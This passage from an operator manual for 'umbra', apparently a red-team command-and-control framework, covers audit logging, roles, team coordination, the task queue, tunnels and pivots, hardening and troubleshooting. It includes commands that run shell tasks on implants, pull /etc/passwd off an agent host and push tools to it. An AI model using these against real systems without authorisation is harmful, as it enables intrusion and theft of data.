  loses nothing the server does not have.

The path is configurable with `--db` or `UMBRA_DB`; an empty value switches
the notebook off entirely.

## 5b. Audit trail

Every operator command is appended to `audit_file` as one JSON object per line,
before the reply is sent:

```json
{"at":"2026-10-26T09:14:03.511Z","operator":"alice","peer":"10.0.0.5:51822","transport":"tcp/operator","cmd":"task.submit","ok":true,"agent_id":"web-01","task_id":"t-9f3a","detail":"map[cmd:id kind:shell]","ms":2}
```

* Written with `O_APPEND` + `fsync` per line over a `0600` file: a line that is
  lost in a crash would defeat the point.
* Lives next to the state file (`/var/lib/umbra/audit.jsonl` in the shipped
  unit) because that is the only directory the unit can write to
  (`ProtectSystem=strict`). Ship it off-box: a server that can rewrite its own
  audit log is not an audit log.
* `audit_max_mb` (default 8) rotates the file to `*.1`…`*.5`; old files are
  never truncated in place.
* Free-form fields (arguments, errors) are clipped to 512 characters, so one
  huge `--args` blob cannot make a line unbounded.
* An audit write failure is logged and the RPC still completes — a full disk
  must not stop an engagement, but it must be visible in `journalctl`.
* Read it back with `umbra audit --limit 20` (newest first), or from the file:

```bash
jq -c 'select(.ok == false)' data/audit.jsonl | tail
jq -r '[.at, .operator, .cmd] | @tsv' data/audit.jsonl | tail -20
```

Setting `audit_file` to `""` disables auditing; the server logs a warning at
start-up when it is off, and `umbra audit` says so instead of showing an empty
list. On a real engagement, treat the audit file as evidence: ship it off the
server, and do not give operators write access to it.

## 5c. Roles

Operator identities are configured with a role:

```bash
# /etc/umbra/server.env
UMBRA_OPERATOR_TOKENS=alice:admin:b0a1…,bob:operator:7c2e…,carol:viewer:91fd…
```

`name:token` (the old form) still works and defaults to `operator`. There must be
at least one `admin`, or the server refuses to start — otherwise nobody can
manage the engagement.

| Role | Can |
|---|---|
| `viewer` | read agents, tasks, results, audit, operators, chat, schedules, and the artifact store |
| `operator` | everything a viewer can, plus submit/cancel tasks, change beacon cadence, kill, chat, add schedules, fill and push the artifact store |
| `admin` | everything, plus remove schedules, panic an engagement and other engagement-wide actions |

`umbra whoami` prints your role and the exact command list it allows, and the
console refuses locally what the server would refuse anyway. A refusal is
audited (`ok=false`, `err` starting with `permission denied`), so "who tried
what" includes what they were not allowed to do.

## 5d. Chat and recurring tasks

* `umbra chat hello team` / `umbra chat` — the last 200 messages are kept in
  memory and every console receives them as a `chat` event.
* `umbra schedule add web-01 sysinfo --every 300` creates a recurring task;
  `umbra schedule list` shows the next run, the run count and who created it;
  `umbra schedule rm <id>` deletes it. Schedules are persisted with the state
  file, so a restart does not stop a collection run. The interval is clamped to
  5–86400 s, and a schedule that came due while the server was down fires once,
  not once per missed interval.

## 5e. Working as a team

The server is shared state: everything one console does is visible to the
others, and three small mechanisms keep a team from stepping on each other.

* **Who is where** — `umbra operators` lists every connected console with its
  role, the agent it is focused on, how long it has been idle and how deep its
  event queue is. The interactive console announces your focus automatically on
  `use <agent>`; `umbra focus web-01` (or `focus` to clear) does it from a
  script. Teammates see an `operator.focus` event.
* **Claims** — before working a task that someone else might grab, run
  `umbra claim <task-id>`. `umbra tasks` then shows `CLAIMED BY`, `task.claim`
  refuses a second operator with `task is claimed by <name>`, and
  `umbra release <task-id>` frees it. A claim orders people, it does not gate
  the task: the beacon never waits for one, and a finished task cannot be
  claimed. Claims survive a restart with the task itself.
* **Directed chat** — `umbra chat --to bob "web-01 is staged"` (or
  `chat @bob …` in the console) pushes the line only to Bob's console and your
  own. The history stays shared and shows the recipient, because a shared
  engagement needs a shared record: treat it as addressing, not encryption.

## 5e.1 The presence, the lease and the handover

Three more things keep a team from fighting itself.

* **The presence expires** — a console that stops talking for ninety seconds
  is *silent*, and after two minutes it is *stale*: the socket may still be
  open, but the team does not wait for it any more. `umbra operators` and
  `umbra chat --operators` both show it, so a colleague that is gone looks
  gone instead of busy.
* **A claim has a lease** — the promise that somebody is working on a task
  only lasts as long as the presence behind it. When the holder goes stale the
  claim expires, the task becomes available again and the team is told. The
  task row carries `CLAIMED BY`, the age of the claim and whether it is still
  live.
* **An assignment is a handover** — `umbra assign <task-id> bob` says who is
  expected to work on a task; it does not stop anybody else from taking it.
  Bob sees it in `umbra inbox`, and the team sees a `task.assigned` event.
* **The namespace is shared** — `umbra alias add` writes a command that
  everybody uses, and the list says who wrote it and when. The namespace is
  kept next to the state file, so the template one operator wrote is there
  for the next one and for the next run of the server. The schedules and
  the alert rules work the same way: the change is an event, and the audit
  trail keeps it.
* **The handover** — `umbra handover --out handover.md` writes the document a
  colleague reads when you go home: the inventory, the open work, the
  findings of the reconnaissance, the persistence, the open sessions, the
  artefacts, the team and the last moves of the journal, plus the notes of
  your own notebook.

The chat never reaches the implants: the stream the agents read carries
tasks and results, never a word of the team.

## 5f. File transfer

```bash
umbra --server 127.0.0.1:4002 --operator alice download web-01 /etc/passwd ./passwd
umbra --server 127.0.0.1:4002 --operator alice upload   web-01 ./collector /tmp/collector
```

Inside the console the same commands are `get <remote> <local>` and
`put <local> <remote>` for the selected agent. Both are chunked at 900 KiB, the
largest payload that still fits in one frame, so arbitrary file sizes work
without a new message type or a second connection:

* every chunk is checked against the SHA-256 the beacon reports;
* downloads are written to `<local>.part` and renamed only after the last chunk
  and the size check pass, so a failed transfer never leaves a truncated file
  that looks complete;
* uploads truncate at offset 0 and report the whole-file hash on the final
  chunk, which the CLI compares with the local file;
* `--chunk` lowers the step size (useful on lossy links); `--timeout` applies
  per chunk, not to the whole transfer.

A transfer is a sequence of ordinary tasks, so it appears in `tasks`, in the
audit trail and in the cancel path like anything else. The beacon reports
`total`, `offset`, `eof` and `sha256` in each RESULT, and the server stores them
as task metadata that `result <task-id>` prints.

## 5g. The operator's experience

The console is the product; the server is its engine. This is what the
console does for the operator who lives in it.

### The shell

The prompt says what the console is looking at right now:

```
umbra[web-01 · 2/3 online · queue 4 · sleep 30s]>
```

The history is kept in `~/.umbra/history`, so the last session is where the
next one starts. The completion knows the commands and the agents by name:
`work` becomes `workflow`, and `use web-` becomes `use web-01`. A command
may be written over several lines: a line with an open quote or bracket is
continued with `... `, so a long JSON argument is written the way it is
read.

### One task, many agents

```bash
umbra run --group dc --group web --kind sysinfo --cap 8 --wait
```

The filter language is the one the server speaks, so the selection is
written once and used for finding agents and for acting on them. The cap
is how many answers are waited for at the same time; the progress line
shows what is coming back, and the table at the end says what every host
answered.

### The plan

A plan file is a workflow written in a small YAML subset (JSON is a plan
too):

```yaml
name: sweep
params: [target]
steps:
  - kind: task
    agent: "{{target}}"
    task_kind: shell
    args:
      cmd: "systeminfo"
  - kind: wait
    seconds: 5
  - kind: report
    title: The sweep
```

```bash
umbra batch --file sweep.yaml --param target=web-01     # run it here, now
umbra workflow add sweep --file sweep.yaml              # save it for the team
umbra workflow run sweep --param target=web-01 --wait   # run it on the server
```

The plan reader lives in the console and reads the subset itself: no YAML
library, no dependency, no surprise. A plan that is not a plan is refused
with the line that is wrong.

### The raw command line

```bash
umbra rpc task.list '{"agent": "web-01"}'
umbra rpc task.submit --arg id=web-01 --arg kind=shell --arg args='{"cmd":"id"}'
```

`umbra rpc` is the escape hatch: every command the server understands is
reachable from the shell, and `--json` makes the answer machine-readable.
The shapes of the answers are documented in `docs/PROTOCOL.md`.

### The notebook

The notebook (`~/.umbra/state.db`) holds what the operator collected: the
sessions, the tasks, the answers, the notes, the findings of the
reconnaissance, the artefacts that were pulled off a host, the screenshots
and the material. Everything in it is searchable (`umbra db search admin`),
and it is written either as JSON or as the Markdown document an operator
hands over (`umbra db export --out notebook.md`).

The notebook is the operator's own file on the operator's own disk, and it
holds the value of the material that was collected. Treat it like the
notebook it is: do not leave it in a shared directory, and do not put it in
a ticket.

## 5h. The queue, the breakers and the metrics

### The queue is predictable

The queue of the server is the part an operator trusts last and needs
first. Four things decide what happens when there is more work than the
hosts can take:

| rule | what it does | the key |
|---|---|---|
| **the priority** | the urgent task goes first; the rest keeps its order, so nothing starves | `umbra priority <task-id> 10` |
| **the work in flight** | a host that is already busy is not given more work | `queue.max_in_flight_per_agent` |
| **the rate of the host** | one host receives work at a bounded rate | `queue.max_deliver_per_minute_per_agent` |
| **the throughput of the server** | the whole server hands out a bounded number of tasks per second | `queue.max_deliver_per_second` |

```bash
umbra --server 127.0.0.1:4002 --operator alice priority t-9f3a 10
umbra --server 127.0.0.1:4002 --operator alice queue
```

### The dead letter queue

A task that fails too many times (`queue.max_attempts`, three by default)
is **not** run again: a task that may have run must not run a second time
without a decision. It goes to the dead letter queue, where it stays
visible with the reason and the trace.

```bash
umbra --server 127.0.0.1:4002 --operator alice queue
```

### The circuit breaker

A host that fails too many times in a row (`queue.breaker_threshold`,
five by default) has its breaker opened: the server stops handing work to
it. After the cooldown (`queue.breaker_cooldown_s`, sixty seconds) one
probe goes through, and the answer of the probe decides whether the
breaker stays open. A host that is really gone is a host that should not
be given work.

### The maintenance window

```bash
umbra --server 127.0.0.1:4002 --operator alice quiet on --until 1780000000
```

The beacons keep checking in and get nothing; nothing new is queued. The
window ends by itself, or with `quiet off`. The change is an event and an
audit line.

### The trace

Every task carries a trace id from the RPC that queued it to the result
that came back:

```bash
umbra --server 127.0.0.1:4002 --operator alice tasks --trace 4f2a9c11
```

The trace is in the task record, in the events and in the audit trail, so
one identifier follows the work from the operator to the implant and back.

### The metrics

The dashboard serves the counters of the server in the Prometheus text
format.  The dashboard is off in the deployed configuration — it is a
wide surface ✗ — so a deployment that wants the metrics turns it on, on
the loopback, with a token of its own:

```json
{"dashboard_listen": "127.0.0.1:4004", "dashboard_token": "<32 bytes of hex>"}
```

```bash
curl -H "Authorization: Bearer $TOKEN" http://127.0.0.1:4004/metrics
```

| metric | what it is |
|---|---|
| `umbra_agents`, `umbra_agents_online` | the inventory and how much of it answers |
| `umbra_tasks_pending`, `umbra_tasks_done`, `umbra_tasks_failed`, `umbra_tasks_dead_letter` | the queue and its outcome |
| `umbra_task_latency_seconds` | the histogram: how long a task took between the delivery and the result |
| `umbra_checkins_total` | how often the beacons check in |
| `umbra_agents_by_transport` | the transport mix |
| `umbra_bytes_in_total`, `umbra_bytes_out_total` | the bytes that moved |
| `umbra_operators` | the consoles that are connected |
| `umbra_events_dropped_total` | the events a console missed |
| `umbra_breakers_open` | the hosts whose breaker is open |
| `umbra_quiet` | one when the server is in its maintenance window |

The health check needs no token, and says nothing but that the process is
alive: `GET /healthz`.

## 5i. The versions, and what to do when a host is old

The server speaks two handshake versions at the same time and answers in
the version the peer asked for, so a beacon that was built before the
second version keeps working.  The matrix is in the protocol document
(§5.1); what the operator sees is the `hello_version` of every host in
the inventory.

```bash
umbra --server 127.0.0.1:4002 --operator alice agents
```

| `hello_version` | what the host speaks | what to do |
|---|---|---|
| 2 | the second handshake: the capability list, the implant version, the module ABI and the platform details | nothing |
| 1 | the first handshake: the capability list is inside the metadata | nothing; it still works |
| 0 | a host that never said | the server refused the handshake |

A host that is still on the first version does not send heartbeats, so
the inventory shows no heartbeat for it.  That is the only difference
an operator sees.

## 6. Monitoring

```bash
umbra --server 127.0.0.1:4002 --operator alice stats
umbra --server 127.0.0.1:4002 --operator alice operators   # who else is connected
umbra --server 127.0.0.1:4002 --operator alice audit --limit 20
umbra --server 127.0.0.1:4002 --operator alice watch       # live event stream
umbra --server 127.0.0.1:4002 --operator alice cancel t-9f3a
journalctl -u umbra-server | grep -E "handshake failed|exceeded frame budget|queue full"
```

Signals that matter:

| Log line | Meaning |
|---|---|
| `handshake failed` (repeated, same peer) | wrong PSK, clock skew > 300 s, or scanning |
| `operator key used on the agent listener` | misconfigured implant (operator token in a beacon) |
| `agent exceeded frame budget` | runaway or hostile peer; connection dropped |
| `operator event queue full` | an operator console stopped reading; events are dropped (counted in `stats.events_dropped`), agent traffic is unaffected |
| `state save failed` | disk full/permissions — fix before restarting |
| `audit write failed` | the audit trail is incomplete; fix the disk and treat the missing window as a gap in the record |
| `rate limited` (in a response) | an operator console is looping faster than 40 RPC/s; the call was refused, not queued |

Clock skew is the most common deployment issue: the handshake rejects peers whose
`ts` differs by more than `max_clock_skew_s` (default 300 s). Keep both sides on
NTP, or raise the limit if you accept the risk.

## 7. Hardening checklist

- [ ] operator listener bound to loopback and reached over SSH/WireGuard
- [ ] HTTP transport inside an encrypted tunnel, proxy `client_max_body_size` ≥ 2 MB
- [ ] `agent.psk` and `server.env` mode `0600`, owned by the service user
- [ ] config file mode `0600` (it contains paths, not secrets, but keep it tight)
- [ ] systemd hardening enabled (the provided unit drops all capabilities)
- [ ] tokens per operator, rotated when someone leaves, fingerprints audited
- [ ] `data_file` on a filesystem with enough room for task history
- [ ] outbound allow-list on the implant host (only the C2 address/port)
- [ ] logs shipped somewhere the operators cannot silently edit
- [ ] mutual TLS for a remote console (`tls_listen`, `tls_client_ca`), the token alone is not enough
- [ ] `http_pad` set, so the length of a request does not tell what it carried
- [ ] armory signing key offline; the catalogue is signed before it is copied to the server
- [ ] `socks_listen` and `vpn_listen` bound to an interface only the team can reach
- [ ] `socks_user` and `socks_password` set on every proxy that is not bound to loopback
- [ ] `pivot_deny` holds the ranges the operation must not touch (link-local, the metadata address)
- [ ] rendered stagers deleted after the engagement (they carry the agent key)

## 8. Upgrades

1. Stop the operator consoles (they reconnect).
2. Replace the binary, keep `server.json` (config is forward compatible; unknown
   keys are ignored, new fields have defaults).
3. `systemctl restart umbra-server` — established agents reconnect at their next
   cycle with fresh ephemeral keys, so nothing has to be rebuilt after a
   server-side change.
4. If the protocol changed (new `umbra/vN`), rebuild the implants; the server
   rejects `HELLO` frames whose `v` it does not implement, and logs the version
   mismatch.

## 9. Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| `connection failed: ...` in the console | wrong token, wrong `--operator` name, or the server is not listening | check `UMBRA_OPERATOR_TOKENS` and that `--operator` matches the name in the env |
| agent connects but never appears | handshake rejected | run the beacon with `--verbose`; check PSK and clock |
| tasks stay `queued` | agent asleep or offline | `agents.list`, wait for the next cycle, or lower `sleep` |
| `task timed out` | command exceeds the implant's `timeout` arg (default 120 s) | pass `--args '{"cmd":"...","timeout":300}'` |
| HTTP beacon gets 401/410 | session expired (`idle_timeout_s`) or handshake failed | reload the beacon; check the reverse proxy forwards the path verbatim |
| `frame too large` | output > 1 MiB or file download > 900 KiB | use `download` chunks / redirect to a file and pull it in pieces |
| everything works, then stops after a day | keys rotated but a peer missed the `REKEY` frame | should not happen: `REKEY` always precedes `TASK_BATCH` (PROTOCOL.md §6). Look for `session rekeyed` in the beacon log; if it is missing, capture both sides and file a bug |
| link drops with "nonce mismatch" right as an operator connects or a task completes | two writers sealed and wrote out of order | nothing to fix in the field: a correctly written pair keeps `seal+write` in one critical section (SEND-SERIAL). If it recurs, it is a bug in the writer added last |
| the operator link dies with a TLS error (a bad record MAC) or answers half a request | two threads were inside the same TLS session at once | nothing to fix in the field: the transport keeps one thread inside the session at a time (TLS-ONE-SESSION, PROTOCOL.md §4). If it recurs, it is a bug in the writer added last |
| `pivot.open` says the agent never answered | the agent is asleep, or the callback was refused | the agent dials back on its own; check the agent listener is reachable from the agent host and watch the server log for `tunnel callback` |
| the SOCKS5 proxy refuses a CONNECT | the target is unreachable from the agent, not from the console | test the same target from the agent host; the proxy is only a relay |
| the SOCKS5 proxy answers `0x02` | the target is on the deny list | the connection log says which rule matched; drop the rule from `pivot_deny` or pick another target |
| the SOCKS5 proxy answers `0x01` | the agent could not open the stream | the agent is asleep or the session was lost; wait for the next cycle and try again |
| the proxy asks for a password | the tunnel carries credentials | the pair belongs to the tunnel (`--user` / `--password`) or to the permanent proxy (`socks_user` / `socks_password`) |
| a forward stops answering after the agent slept | the agent is not back yet | the listener stays bound: the first connection after the agent returns is served by the new session |
| a name does not resolve through the proxy | the agent cannot resolve that name | the name is resolved by the agent by default; `--dns local` makes the server resolve it instead |
| `pivot release` says the claim is unknown | the claim was already released, or the tunnel was closed | `umbra pivot claims` shows what is still claimed; the accounting of the released tunnels stays in the log |
| the DNS tunnel gets no answer | the resolver does not know the tunnel domain, or the agent queries the wrong one | point the agent at the server resolver (`UMBRA_DNS_RESOLVER`) and the domain (`UMBRA_DNS_DOMAIN`), and check the server log for `dns tunnel listening` |
| the WebSocket beacon refuses to connect | the route is wrong, or a proxy in front does not forward the upgrade | the upgrade happens on the beacon route (`/api/v1/beacon`); the proxy needs `proxy_set_header Upgrade $http_upgrade` |
| the console says `TLS handshake with ... failed` | the CA does not match, or the name in the certificate does not match `--tls-server-name` | pass the right `--tls-ca`, and use the name the certificate carries |
| the console is refused by the mutual TLS listener | no client certificate was presented | add `--tls-cert` and `--tls-key`; the listener always requires one |
